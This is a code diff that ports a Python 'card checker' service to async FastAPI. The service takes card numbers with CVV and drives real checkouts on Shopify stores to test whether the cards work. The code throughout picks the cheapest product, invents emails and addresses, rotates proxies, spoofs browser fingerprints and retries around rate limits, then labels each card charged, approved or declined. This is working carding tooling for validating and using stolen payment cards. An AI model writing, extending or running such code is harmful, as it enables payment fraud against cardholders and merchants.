-        status, body = _send_proposal(session, shop_url, checkout_url, checkout_token, session_token,
+        status, body = await _send_proposal(session, shop_url, checkout_url, checkout_token, session_token,
                                       build_id, source_token,
                                       _build_proposal_variables(session_token, None, stable_id, variant_id,
                                                                 "", addr, currency, country, captcha),
@@ -1312,13 +1364,13 @@ def persisted_checkout(shop_url, variant, card, email, shipping, billing, curren
         if _ctr and _ctr != country:
             country = _ctr
         addr = shipping if shipping.get("countryCode", "") == country else random_address(country)
-        time.sleep(0.3)
+        await asyncio.sleep(0.3)
 
         # proposal 2 — email + address, retry until delivery handle or 3 tries
         proposal_body = body
         queue_token2 = ""
         for _attempt, _delay in enumerate([0.2, 0.4, 0.8], start=1):
-            status, proposal_body = _send_proposal(session, shop_url, checkout_url, checkout_token, session_token,
+            status, proposal_body = await _send_proposal(session, shop_url, checkout_url, checkout_token, session_token,
                                                    build_id, source_token,
                                                    _build_proposal_variables(session_token, queue_token, stable_id, variant_id,
                                                                              email, addr, currency, country, captcha,
@@ -1330,7 +1382,7 @@ def persisted_checkout(shop_url, variant, card, email, shipping, billing, curren
             if '"PendingTerms"' not in proposal_body and _extract_delivery_handle(proposal_body):
                 break
             if _attempt < 3:
-                time.sleep(_delay)
+                await asyncio.sleep(_delay)
         if not queue_token2:
             queue_token2 = queue_token
 
@@ -1344,7 +1396,7 @@ def persisted_checkout(shop_url, variant, card, email, shipping, billing, curren
         card_bin = str(card["number"])[:8]
         card_name = f"{addr.get('firstName', '')} {addr.get('lastName', '')}".strip() or "Card Holder"
 
-        status, pci_body = _send_pci(session, ident_sig, card, card_name, shop_url,
+        status, pci_body = await _send_pci(session, ident_sig, card, card_name, shop_url,
                                      vault_url=vault_url, vault_domain=vault_domain, proxy=proxy_url,
                                      build_hash=pci_build, proxies=plist)
         if status != 200:
@@ -1501,7 +1553,7 @@ def persisted_checkout(shop_url, variant, card, email, shipping, billing, curren
         submit_headers = _proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
 
         for attempt in range(8):
-            submit_status, submit_body = _post_retry(
+            submit_status, submit_body = await _post_retry(
                 session, f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
                 proxies=plist, data=submit_payload, headers=submit_headers)
             if submit_status == 0:
@@ -1510,14 +1562,14 @@ def persisted_checkout(shop_url, variant, card, email, shipping, billing, curren
                 doc = _GQL.get("submit")
                 if doc and attempt < 6:
                     fb = json.dumps({"operationName": "SubmitForCompletion", "variables": submit_variables, "query": doc})
-                    submit_status, submit_body = _post_retry(
+                    submit_status, submit_body = await _post_retry(
                         session, f"{shop_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion",
                         proxies=plist, data=fb, headers=submit_headers)
                     if submit_status != 200:
-                        time.sleep(random.uniform(0.8, 1.4))
+                        await asyncio.sleep(random.uniform(0.8, 1.4))
                         continue
                 else:
-                    time.sleep(random.uniform(0.8, 1.4))
+                    await asyncio.sleep(random.uniform(0.8, 1.4))
                     continue
             if submit_status != 200:
                 return {"status": "error", "step": "submit", "http": submit_status, "error": submit_body[:300]}
@@ -1649,7 +1701,7 @@ def persisted_checkout(shop_url, variant, card, email, shipping, billing, curren
         last_poll = ""
         generic_retried = False
         for _ in range(12):
-            poll_status, poll_body = _get_retry(
+            poll_status, poll_body = await _get_retry(
                 session, f"{shop_url}/checkouts/internal/graphql/persisted?{poll_params}",
                 proxies=plist, headers=poll_headers)
             if poll_status in (429, 403) or poll_status >= 500:
@@ -1659,7 +1711,7 @@ def persisted_checkout(shop_url, variant, card, email, shipping, billing, curren
                                      "variables": {"receiptId": receipt_id,
                                                    "sessionToken": receipt_session_token or session_token},
                                      "query": doc})
-                    poll_status, poll_body = _post_retry(
+                    poll_status, poll_body = await _post_retry(
                         session, f"{shop_url}/checkouts/unstable/graphql?operationName=PollForReceipt",
                         proxies=plist, data=fb, headers=poll_headers)
             if poll_status != 200:
@@ -1671,7 +1723,7 @@ def persisted_checkout(shop_url, variant, card, email, shipping, billing, curren
                     generic_retried = True
                     submit_variables["attemptToken"] = f"{checkout_token}-{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))}"
                     submit_payload = json.dumps({"variables": submit_variables, "operationName": "SubmitForCompletion", "id": submit_id})
-                    s2, b2 = _post_retry(
+                    s2, b2 = await _post_retry(
                         session, f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
                         proxies=plist, data=submit_payload, headers=submit_headers)
                     if s2 == 200:
@@ -1692,14 +1744,14 @@ def persisted_checkout(shop_url, variant, card, email, shipping, billing, curren
                         "gate": _gateway, "amount": cur_total, "raw": poll_body[:2500] if code == "GENERIC_ERROR" else ""}
             m = re.search(r'"pollDelay"\s*:\s*(\d+)', poll_body)
             delay = int(m.group(1)) if m else 500
-            time.sleep(min(delay, 1000) / 1000.0)
+            await asyncio.sleep(min(delay, 1000) / 1000.0)
 
         if _poll_3ds(last_poll):
             return {"status": "approved", "code": "3DS_REQUIRED", "receipt_id": receipt_id, "gate": _gateway}
         return {"status": "error", "code": "POLL_TIMEOUT", "receipt_id": receipt_id, "gate": _gateway}
 
 
-def legacy_checkout(shop_url, variant, card, proxy=None):
+async def legacy_checkout(shop_url, variant, card, proxy=None):
     """Classic checkout fallback (gate.py flow) — no proposals, no ident sig.
     cart/add.js -> authenticity_token -> PATCH steps -> legacy vault
     (deposit.us.shopifycs.com, plain card form) -> final PATCH -> verdict."""
@@ -1707,24 +1759,24 @@ def legacy_checkout(shop_url, variant, card, proxy=None):
     webname = shop_url.replace("https://", "").replace("http://", "").split("/")[0]
     email = generate_random_email()
     addr = random_address("US")
-    with curl_requests.Session(impersonate=random.choice(BROWSER_PROFILES)) as s:
+    async with curl_requests.AsyncSession(impersonate=random.choice(BROWSER_PROFILES)) as s:
         s.timeout = 12
         if proxy_url:
             s.proxies = {"http": proxy_url, "https": proxy_url}
         try:
             # 1. add to cart
-            r1 = s.post(f"{shop_url}/cart/add.js", data={"id": variant["variant_id"], "quantity": 1},
+            r1 = await s.post(f"{shop_url}/cart/add.js", data={"id": variant["variant_id"], "quantity": 1},
                         headers={"x-requested-with": "XMLHttpRequest", "accept": "application/json",
                                  "referer": shop_url + "/"})
             if r1.status_code not in (200, 201):
                 return {"status": "error", "step": "legacy_cart", "error": f"add.js {r1.status_code}"}
             # 2. enter checkout
-            r2 = s.get(f"{shop_url}/checkout", allow_redirects=True)
+            r2 = await s.get(f"{shop_url}/checkout", allow_redirects=True)
             if "/checkouts/" not in (r2.url or ""):
                 return {"status": "error", "step": "legacy_checkout", "error": "no /checkouts/ url"}
             checkout_url = r2.url
             # 3. authenticity token
-            r3 = s.get(checkout_url)
+            r3 = await s.get(checkout_url)
             m = re.search(r'<input type="hidden" name="authenticity_token" value="([^"]+)"', r3.text)
             if not m:
                 return {"status": "error", "step": "legacy_token", "error": "no authenticity_token (modern-only shop)"}
@@ -1751,7 +1803,7 @@ def legacy_checkout(shop_url, variant, card, proxy=None):
                 "checkout[client_details][java_enabled]": "false",
                 "checkout[client_details][browser_tz]": "-330",
             }
-            r4 = s.post(checkout_url, data=contact)
+            r4 = await s.post(checkout_url, data=contact)
             if r4.status_code not in (200, 302):
                 return {"status": "error", "step": "legacy_contact", "error": f"contact {r4.status_code}"}
             if "Shipping Method" not in r4.text and "Shipping method" not in r4.text:
@@ -1759,7 +1811,7 @@ def legacy_checkout(shop_url, variant, card, proxy=None):
             # 5. shipping rates
             ship_tag = ""
             try:
-                r5 = s.get(f"{checkout_url}/shipping_rates?step=shipping_method")
+                r5 = await s.get(f"{checkout_url}/shipping_rates?step=shipping_method")
                 m5 = re.search(r'<div class="radio-wrapper" data-shipping-method="([^"]+)"', r5.text)
                 if m5:
                     ship_tag = m5.group(1)
@@ -1779,7 +1831,7 @@ def legacy_checkout(shop_url, variant, card, proxy=None):
                 "checkout[client_details][java_enabled]": "false",
                 "checkout[client_details][browser_tz]": "-330",
             }
-            r6 = s.post(checkout_url, data=ship)
+            r6 = await s.post(checkout_url, data=ship)
             payment_due = _extract(r6.text, r'"payment_due":\s*"([^"]+)"')
             gateway = _extract(r6.text, r'data-subfields-for-gateway="([^"]+)"')
             # 7. legacy vault tokenization (plain form, no sig)
@@ -1800,7 +1852,7 @@ def legacy_checkout(shop_url, variant, card, proxy=None):
                 if _lane_cooling(proxy_url):
                     break
                 try:
-                    rv = s.post(_vault, data=pci_payload, headers=pci_headers)
+                    rv = await s.post(_vault, data=pci_payload, headers=pci_headers)
                     mv = re.search(r'"id"\s*:\s*"([^"]+)"', rv.text or "")
                     if mv:
                         vault_id = mv.group(1)
@@ -1809,7 +1861,7 @@ def legacy_checkout(shop_url, variant, card, proxy=None):
                         _lane_burn(proxy_url, 60 if rv.status_code == 403 else PCI_BURN_SECONDS)
                         break
                     if rv.status_code == 429:
-                        time.sleep(random.uniform(0.4, 0.8))
+                        await asyncio.sleep(random.uniform(0.4, 0.8))
                         continue
                 except Exception:
                     continue
@@ -1831,9 +1883,9 @@ def legacy_checkout(shop_url, variant, card, proxy=None):
                 "checkout[client_details][java_enabled]": "false",
                 "checkout[client_details][browser_tz]": "-330",
             }
-            r7 = s.post(checkout_url, data=final_data)
+            r7 = await s.post(checkout_url, data=final_data)
             try:
-                g = s.get(f"{checkout_url}/processing?from_processing_page=1&validate=true", allow_redirects=True)
+                g = await s.get(f"{checkout_url}/processing?from_processing_page=1&validate=true", allow_redirects=True)
             except Exception:
                 g = None
             final_html = (g.text if g is not None else (r7.text or ""))
@@ -1858,15 +1910,15 @@ def legacy_checkout(shop_url, variant, card, proxy=None):
             return {"status": "error", "step": "legacy_exc", "error": str(e)[:120]}
 
 
-def graphql_checkout(shop_url, variant, card, email, shipping, billing, currency, country, proxy, proxies=None):
+async def graphql_checkout(shop_url, variant, card, email, shipping, billing, currency, country, proxy, proxies=None):
     variant_id = variant["variant_id"]
     proxy_url = _norm_proxy(proxy or None)
-    with curl_requests.Session(impersonate=random.choice(BROWSER_PROFILES)) as session:
+    async with curl_requests.AsyncSession(impersonate=random.choice(BROWSER_PROFILES)) as session:
         session.timeout = 10
-        cu = _storefront_checkout_url(session, shop_url, variant_id, country, proxy_url)
+        cu = await _storefront_checkout_url(session, shop_url, variant_id, country, proxy_url)
         if not cu:
             return {"status": "error", "code": "CART_ERROR", "step": "cart_create"}
-        return persisted_checkout(shop_url, variant, card, email, shipping, billing, currency, country, proxy,
+        return await persisted_checkout(shop_url, variant, card, email, shipping, billing, currency, country, proxy,
                                   checkout_url_override=cu, dynamic_ids=True, proxies=proxies)
 
 
@@ -1907,6 +1959,20 @@ def _map_code(result):
     return "ERROR"
 
 
+
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# Response shaping
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+def _fmt(amount):
+    if not amount:
+        return "0.00"
+    try:
+        return f"{float(amount):.2f}"
+    except (ValueError, TypeError):
+        return str(amount)
+
+
 def _respond(card, currency, result, variant, proxy_status="not used"):
     code = _map_code(result)
     response = code
@@ -1918,8 +1984,7 @@ def _respond(card, currency, result, variant, proxy_status="not used"):
     elif st == "declined":
         response = "CARD_DECLINED" if code == "CAPTCHA_REQUIRED" else (code or "CARD_DECLINED")
     status_str = "true" if response in ("INSUFFICIENT_FUNDS", "ORDER_PAID") else "false"
-    print(f"[resp] code={response} status={status_str} step={result.get('step','')} err={str(result.get('error',''))[:80]}", flush=True)
-    return jsonify({
+    return {
         "CC": f"{card.get('number','')}|{card.get('month','')}|{card.get('year','')}|{card.get('cvv','')}",
         "Currency": currency,
         "Gateway": result.get("gate", "") or "shopify_payments",
@@ -1927,380 +1992,279 @@ def _respond(card, currency, result, variant, proxy_status="not used"):
         "Proxy": proxy_status or "not used",
         "Response": response,
         "Status": status_str,
-    })
+    }
 
 
-def _fmt(amount):
-    if not amount:
-        return "0.00"
-    try:
-        return f"{float(amount):.2f}"
-    except (ValueError, TypeError):
-        return str(amount)
+_OUTCOME = {
+    "ORDER_PAID": "charged", "INSUFFICIENT_FUNDS": "approved",
+    "3DS_REQUIRED": "pending", "PROCESSING": "pending", "ORDER_SUBMITTED": "pending",
+    "AUTHENTICATION_REQUIRED": "pending", "CAPTCHA_REQUIRED": "pending",
+    "CARD_DECLINED": "declined",
+}
 
 
-def _request_common():
-    if request.method == "GET":
-        cc = request.args.get("cc", "").strip()
-        site = request.args.get("site", "").strip()
-        proxy = request.args.get("proxy", "").strip()
-        proxy_urls = request.args.get("proxy_urls", "").strip()
-        data = {}
-    else:
-        data = request.get_json(force=True)
-        cc = data.get("cc") or data.get("card") or ""
-        site = data.get("site") or data.get("shop") or ""
-        proxy = data.get("proxy") or ""
-        proxy_urls = data.get("proxy_urls") or ""
-    shop_url = site.rstrip("/")
+def _v2_wrap(payload, site):
+    out = dict(payload)
+    live = str(out.get("Proxy", "")).lower() in ("live", "not used")
+    out["Proxy"] = "Live" if live else "Dead"
+    out["site"] = site or ""
+    out["Outcome"] = _OUTCOME.get(str(out.get("Response", "")).upper(), "errors")
+    return out
+
+
+def _count(payload):
+    kind = _OUTCOME.get(str(payload.get("Response", "")).upper(), "errors")
+    if kind in _stats:
+        _stats[kind] += 1
+
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# The check itself — the original ladder, async
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+async def run_check(cc, site, proxy, min_price=0.50, max_price=0.0, variant=None):
+    card = _parse_card(cc)
+    shop_url = (site or "").rstrip("/")
     if shop_url and not shop_url.startswith(("http://", "https://")):
         shop_url = "https://" + shop_url
-    card = _parse_card(cc)
-    proxy = _norm_proxy(proxy or None)
-    proxies = []
-    if proxy:
-        proxies.append(proxy)
-    for p in re.split(r"[,|\s]+", proxy_urls or ""):
-        p = _norm_proxy(p)
-        if p and p not in proxies:
-            proxies.append(p)
-    proxy_status = "not used"
+
+    if not card:
+        return {"CC": cc or "", "Currency": "USD", "Gateway": "unknown",
+                "Price": "0.00", "Proxy": "Dead", "Response": "MISSING_CARD",
+                "Status": "false"}
+
+    proxy = _norm_proxy(proxy) if proxy else ""
+    proxies = [proxy] if proxy else []
+    proxy_status = "live" if proxy else "not used"
     if proxies:
-        alive = []
-        for p in proxies[:5]:
-            if _proxy_ok(p, shop_url + "/"):
-                alive.append(p)
-                _remember_alive(p)
-        if alive:
-            proxies = alive
-            proxy = alive[0]
-            proxy_status = "live"
-        else:
-            proxies = None
-            proxy = None
+        ok = await _proxy_ok(proxies[0], shop_url + "/")
+        if not ok:
             proxy_status = "dead"
-    if not proxies:
-        proxies = []
-    # top up lanes with recently-proven proxies so PCI always has a healthy lane
-    now = time.time()
-    for p, t in reversed(_ALIVE_RING):
-        if now - t > 120 or _lane_cooling(p) or p in proxies:
+
+    currency, country = await fetch_store_currency(shop_url, proxy)
+    email = generate_random_email()
+    addr = random_address(country)
+    shipping = dict(addr)
+    billing = dict(addr)
+
+    result = None
+    direct_tried = False
+    ladder = [min_price, 2.0, 5.0]
+    cur_min = ladder[0]
+    await _pace(shop_url)
+
+    if variant:
+        result = await persisted_checkout(shop_url, variant, card, email, shipping, billing,
+                                          currency, country, proxy, proxies=proxies)
+        variant = None
+
+    for _ in range(len(ladder) + 6):
+        if result is None:
+            variant = await find_cheapest_product(shop_url, proxy, cur_min, max_price)
+            if not variant:
+                result = {"status": "error", "step": "discovery", "error": "no cheap products found"}
+                break
+            result = await persisted_checkout(shop_url, variant, card, email, shipping, billing,
+                                              currency, country, proxy, proxies=proxies)
             continue
-        proxies.append(p)
-        if len(proxies) >= 3:
-            break
-    if proxies:
-        proxy = proxy or proxies[0]
-    proxies = proxies or None
-    return data, shop_url, card, proxy, proxies, proxy_status
 
+        err = str(result.get("error", ""))
+        code = result.get("code", "")
 
-@app.route("/shopii", methods=["GET", "POST"])
-@app.route("/shopii/persisted", methods=["GET", "POST"])
-def shopii_persisted():
-    try:
-        data, shop_url, card, proxy, proxies, proxy_status = _request_common()
-        min_price = float(data.get("min_price", 0.50)) if request.method == "POST" else 0.50
-        max_price = float(data.get("max_price", 0.0)) if request.method == "POST" else 0.0
-        variant = data.get("variant") if request.method == "POST" else None
-        if not shop_url or not card:
-            return jsonify({"CC": request.args.get("cc", ""), "Currency": "USD", "Gateway": "unknown",
-                            "Price": "0.00", "Proxy": proxy_status,
-                            "Response": "MISSING_CARD" if not card else "MISSING_SITE", "Status": "false"}), 400
+        if "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in err or code == "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT":
+            variant = await find_cheapest_product(shop_url, proxy, min(ladder) + (cur_min or 2.0), max_price)
+            if not variant or cur_min >= ladder[-1]:
+                break
+            cur_min = ladder[min(ladder.index(cur_min) + 1 if cur_min in ladder else 0, len(ladder) - 1)]
+            variant = await find_cheapest_product(shop_url, proxy, cur_min, max_price)
+            if not variant:
+                result = {"status": "error", "step": "discovery", "error": "no cheap products found"}
+                break
+            result = await persisted_checkout(shop_url, variant, card, email, shipping, billing,
+                                              currency, country, proxy, proxies=proxies)
+            continue
 
-        currency, country = fetch_store_currency(shop_url, proxy)
-        email = generate_random_email()
-        addr = random_address(country)
-        shipping = dict(addr)
-        billing = dict(addr)
-
-        result = None
-        direct_tried = False
-        ladder = [min_price, 2.0, 5.0]
-        cur_min = ladder[0]
-        _pace(shop_url)
-        if variant:
-            result = persisted_checkout(shop_url, variant, card, email, shipping, billing, currency, country, proxy, proxies=proxies)
-            variant = None
-        for _ in range(len(ladder) + 6):
-            if result is None:
-                variant = find_cheapest_product(shop_url, proxy, cur_min, max_price)
-                if not variant:
-                    result = {"status": "error", "step": "discovery", "error": "no cheap products found"}
-                    break
-                result = persisted_checkout(shop_url, variant, card, email, shipping, billing, currency, country, proxy, proxies=proxies)
-                continue
-            err = str(result.get("error", ""))
-            code = result.get("code", "")
-            if "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in err or code == "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT":
-                variant = find_cheapest_product(shop_url, proxy, min(ladder) + (cur_min or 2.0), max_price)
-                if not variant or cur_min >= ladder[-1]:
-                    break
-                cur_min = ladder[min(ladder.index(cur_min) + 1 if cur_min in ladder else 0, len(ladder) - 1)]
-                variant = find_cheapest_product(shop_url, proxy, cur_min, max_price)
-                if not variant:
-                    result = {"status": "error", "step": "discovery", "error": "no cheap products found"}
-                    break
-                result = persisted_checkout(shop_url, variant, card, email, shipping, billing, currency, country, proxy, proxies=proxies)
-                continue
-            if "DELIVERY_NO_DELIVERY_STRATEGY" in err:
-                tried = False
-                for fc in ("US", "CA", "GB", "AU"):
-                    if fc == country:
-                        continue
-                    addr = random_address(fc)
-                    shipping = dict(addr)
-                    billing = dict(addr)
-                    if variant:
-                        result = persisted_checkout(shop_url, variant, card, email, shipping, billing, currency, fc, proxy, proxies=proxies)
-                        if "DELIVERY_NO_DELIVERY_STRATEGY" not in str(result.get("error", "")):
-                            country = fc
-                            tried = True
-                            break
-                if not tried:
-                    break
-                continue
-            if "no token/session" in err or "checkout_init" in err:
-                if proxy and not direct_tried:
-                    direct_tried = True
-                    if variant:
-                        result = persisted_checkout(shop_url, variant, card, email, shipping, billing, currency, country, None, proxies=None)
-                    else:
-                        variant = find_cheapest_product(shop_url, None, cur_min, max_price)
-                        if not variant:
-                            result = {"status": "error", "step": "discovery", "error": "no cheap products found"}
-                            break
-                        result = persisted_checkout(shop_url, variant, card, email, shipping, billing, currency, country, None, proxies=None)
+        if "DELIVERY_NO_DELIVERY_STRATEGY" in err:
+            tried = False
+            for fc in ("US", "CA", "GB", "AU"):
+                if fc == country:
                     continue
-                variant = find_cheapest_product(shop_url, proxy, cur_min + 0.01, max_price)
-                if not variant:
-                    result = {"status": "error", "step": "discovery", "error": "no cheap products found"}
-                    break
-                result = persisted_checkout(shop_url, variant, card, email, shipping, billing, currency, country, proxy, proxies=proxies)
+                addr = random_address(fc)
+                shipping = dict(addr)
+                billing = dict(addr)
+                if variant:
+                    result = await persisted_checkout(shop_url, variant, card, email, shipping, billing,
+                                                      currency, fc, proxy, proxies=proxies)
+                    if "DELIVERY_NO_DELIVERY_STRATEGY" not in str(result.get("error", "")):
+                        country = fc
+                        tried = True
+                        break
+            if not tried:
+                break
+            continue
+
+        if "no token/session" in err or "checkout_init" in err:
+            if proxy and not direct_tried:
+                direct_tried = True
+                if variant:
+                    result = await persisted_checkout(shop_url, variant, card, email, shipping, billing,
+                                                      currency, country, None, proxies=None)
+                else:
+                    variant = await find_cheapest_product(shop_url, None, cur_min, max_price)
+                    if not variant:
+                        result = {"status": "error", "step": "discovery", "error": "no cheap products found"}
+                        break
+                    result = await persisted_checkout(shop_url, variant, card, email, shipping, billing,
+                                                      currency, country, None, proxies=None)
                 continue
-            break
+            variant = await find_cheapest_product(shop_url, proxy, cur_min + 0.01, max_price)
+            if not variant:
+                result = {"status": "error", "step": "discovery", "error": "no cheap products found"}
+                break
+            result = await persisted_checkout(shop_url, variant, card, email, shipping, billing,
+                                              currency, country, proxy, proxies=proxies)
+            continue
+        break
 
-        code0 = _map_code(result)
-        if code0 in ("PCI_ERROR", "CART_ERROR", "PROPOSAL_ERROR", "ERROR") and variant:
-            if "__ALL_LANES_PARKED__" not in str(result.get("error", "")):
-                leg = legacy_checkout(shop_url, variant, card, proxy)
-                if leg.get("status") in ("charged", "approved", "declined"):
-                    result = leg
-        return _respond(card, currency, result, variant, proxy_status)
-    except Exception as e:
-        return jsonify({"CC": "", "Currency": "USD", "Gateway": "unknown",
-                        "Price": "0.00", "Proxy": "not used", "Response": "ERROR", "Status": "false"}), 200
-
+    code0 = _map_code(result)
+    if code0 in ("PCI_ERROR", "CART_ERROR", "PROPOSAL_ERROR", "ERROR") and variant:
+        if "__ALL_LANES_PARKED__" not in str(result.get("error", "")):
+            leg = await legacy_checkout(shop_url, variant, card, proxy)
+            if leg.get("status") in ("charged", "approved", "declined"):
+                result = leg
+    return _respond(card, currency, result, variant, proxy_status)
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# /sh — v7/main_v2.py-compatible endpoint
-#   key=... (required) cc=... proxy=... site=... (optional, falls back to SITES_FILE)
+# HTTP surface
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-def _v2_err(cc, site, code, http_code, proxy="Dead"):
-    return jsonify({
-        "Gateway": "Shopify Payments", "Currency": "USD", "Price": "0.00",
-        "Proxy": proxy, "Response": code, "Status": "false",
-        "CC": cc or "", "site": site or "",
-    }), http_code
+app = FastAPI(title="kali_api", docs_url=None, redoc_url=None)
 
 
-def _stats_bump(payload):
-    resp = str((payload or {}).get("Response", "")).upper()
-    with _stats_lock:
-        if resp == "ORDER_PAID":
-            _stats["charged"] += 1
-        elif resp in ("INSUFFICIENT_FUNDS", "APPROVED"):
-            _stats["approved"] += 1
-        elif resp in ("3DS_REQUIRED", "PROCESSING", "ORDER_SUBMITTED", "AUTHENTICATION_REQUIRED"):
-            _stats["pending"] += 1
-        elif resp in ("CARD_DECLINED", "DECLINED"):
-            _stats["declined"] += 1
-        else:
-            _stats["errors"] += 1
+@app.get("/")
+@app.get("/health")
+async def health():
+    return {"ok": True, "api": "sh"}
 
 
-@app.route("/sh", methods=["GET", "POST"])
-def sh_route():
+@app.get("/shopii/health")
+async def legacy_health():
+    return {"status": "ok", "service": "shopify-gate"}
+
+
+@app.get("/stats")
+async def stats():
+    return dict(_stats)
+
+
+@app.api_route("/sh", methods=["GET", "POST"])
+async def sh(request: Request, key: str | None = Query(None), cc: str | None = Query(None),
+             proxy: str | None = Query(None), site: str | None = Query(None)):
     body = {}
     if request.method == "POST":
-        body = request.get_json(silent=True) or {}
+        try:
+            body = await request.json()
+        except Exception:
+            body = {}
+    key = key or body.get("key")
+    cc = cc or body.get("cc") or body.get("card")
+    proxy = proxy or body.get("proxy")
+    site = site or body.get("site") or body.get("shop")
 
-    def _p(*names):
-        for n in names:
-            v = request.args.get(n)
-            if v:
-                return v.strip()
-        for n in names:
-            v = body.get(n)
-            if v:
-                return str(v).strip()
-        return ""
-
-    if not _key_ok(_p("key")):
-        return jsonify({"error": "invalid or missing API key"}), 401
-
-    cc    = _p("cc", "card")
-    site  = _p("site", "shop")
-    proxy = _p("proxy")
-
+    if not _key_ok(key):
+        return JSONResponse({"error": "invalid or missing API key"}, status_code=401)
     if not cc:
-        return _v2_err("", site, "MISSING_PARAMETERS", 400)
-    if CFG.SITE_MODE == "file" or not site:
+        return JSONResponse(_v2_wrap({"Response": "MISSING_PARAMETERS", "Proxy": "Dead",
+                                      "CC": "", "Currency": "USD", "Gateway": "unknown",
+                                      "Price": "0.00", "Status": "false"}, site or ""), status_code=400)
+
+    if SITE_MODE == "file" or not site:
         picked = _pick_site()
         if picked:
             site = picked
     if not site:
-        return _v2_err(cc, "", "NO_SITES_AVAILABLE", 503)
+        return JSONResponse(_v2_wrap({"Response": "NO_SITES_AVAILABLE", "Proxy": "Dead",
+                                      "CC": cc, "Currency": "USD", "Gateway": "unknown",
+                                      "Price": "0.00", "Status": "false"}, ""), status_code=503)
 
-    if not _acquire_slot():
-        return _v2_err(cc, site, "SERVER_BUSY", 503)
+    if not await _acquire():
+        return JSONResponse(_v2_wrap({"Response": "SERVER_BUSY", "Proxy": "Dead",
+                                      "CC": cc, "Currency": "USD", "Gateway": "unknown",
+                                      "Price": "0.00", "Status": "false"}, site), status_code=503)
 
-    with _stats_lock:
-        _stats["active"] += 1
-        _stats["total"] += 1
+    _stats["active"] += 1
+    _stats["total"] += 1
     t0 = time.monotonic()
     try:
-        qs = {"cc": cc, "site": site, "proxy": proxy}
-
-        def _run():
-            with app.test_request_context("/shopii", method="GET", query_string=qs):
-                return shopii_persisted()
-
-        try:
-            out = _EXEC.submit(_run).result(timeout=int(CFG.REQUEST_TIMEOUT))
-        except concurrent.futures.TimeoutError:
-            _stats_bump({"Response": "TIMEOUT"})
-            return _v2_err(cc, site, "TIMEOUT", 504)
-        if isinstance(out, tuple):
-            resp, code = out[0], out[1]
-        else:
-            resp, code = out, 200
-        payload = resp.get_json(silent=True) or {}
-        shaped = _v2_shape(payload, site, payload.get("Proxy"))
-        shaped["elapsed"] = round(time.monotonic() - t0, 2)
-        _stats_bump(shaped)
-        return jsonify(shaped), code
-    finally:
-        with _stats_lock:
-            _stats["active"] -= 1
-        _release_slot()
-
-
-@app.route("/stats", methods=["GET"])
-def sh_stats():
-    with _stats_lock:
-        return jsonify(dict(_stats))
-
-
-@app.route("/health", methods=["GET"])
-@app.route("/", methods=["GET"])
-def sh_health():
-    return jsonify({"ok": True, "api": "sh"})
-
-
-@app.route("/shopiig", methods=["GET", "POST"])
-@app.route("/shopii/graphql", methods=["GET", "POST"])
-def shopii_graphql():
-    try:
-        data, shop_url, card, proxy, proxies, proxy_status = _request_common()
-        min_price = float(data.get("min_price", 0.50)) if request.method == "POST" else 0.50
-        max_price = float(data.get("max_price", 0.0)) if request.method == "POST" else 0.0
-        variant = data.get("variant") if request.method == "POST" else None
-        if not shop_url or not card:
-            return jsonify({"CC": request.args.get("cc", ""), "Currency": "USD", "Gateway": "unknown",
-                            "Price": "0.00", "Proxy": proxy_status,
-                            "Response": "MISSING_CARD" if not card else "MISSING_SITE", "Status": "false"}), 400
-
-        currency, country = fetch_store_currency(shop_url, proxy)
-        email = generate_random_email()
-        addr = random_address(country)
-        shipping = dict(addr)
-        billing = dict(addr)
-
-        if not variant:
-            variant = find_cheapest_product(shop_url, proxy, min_price, max_price)
-        if not variant:
-            return jsonify({"CC": f"{card.get('number','')}|{card.get('month','')}|{card.get('year','')}|{card.get('cvv','')}",
-                            "Currency": currency, "Gateway": "shopify_payments",
-                            "Price": "0.00", "Proxy": proxy_status,
-                            "Response": "NO_PRODUCTS", "Status": "false"}), 200
-
-        result = None
-        _pace(shop_url)
-        result = graphql_checkout(shop_url, variant, card, email, shipping, billing, currency, country, proxy, proxies=proxies)
-        if result.get("code") == "CART_ERROR" and proxy:
-            direct_result = graphql_checkout(shop_url, variant, card, email, shipping, billing, currency, country, None, proxies=None)
-            if direct_result.get("code") != "CART_ERROR":
-                result = direct_result
-        for _retry in range(3):
-            if "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in str(result.get("code", "")) or \
-               "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in str(result.get("error", "")):
-                cur_min = [2.0, 5.0, 10.0][_retry]
-                nxt = find_cheapest_product(shop_url, proxy, cur_min, max_price)
-                if not nxt or nxt.get("variant_id") == variant.get("variant_id"):
-                    break
-                variant = nxt
-                result = graphql_checkout(shop_url, variant, card, email, shipping, billing, currency, country, proxy, proxies=proxies)
-            else:
-                break
-
-        code0 = _map_code(result)
-        if code0 in ("PCI_ERROR", "CART_ERROR", "PROPOSAL_ERROR", "ERROR"):
-            leg = legacy_checkout(shop_url, variant, card, proxy)
-            if leg.get("status") in ("charged", "approved", "declined"):
-                result = leg
-        return _respond(card, currency, result, variant, proxy_status)
+        payload = await asyncio.wait_for(run_check(cc, site, proxy or ""), timeout=REQUEST_TIMEOUT)
+    except asyncio.TimeoutError:
+        payload = {"CC": cc, "Currency": "USD", "Gateway": "unknown", "Price": "0.00",
+                   "Proxy": "Dead", "Response": "TIMEOUT", "Status": "false"}
     except Exception as e:
-        return jsonify({"CC": "", "Currency": "USD", "Gateway": "unknown",
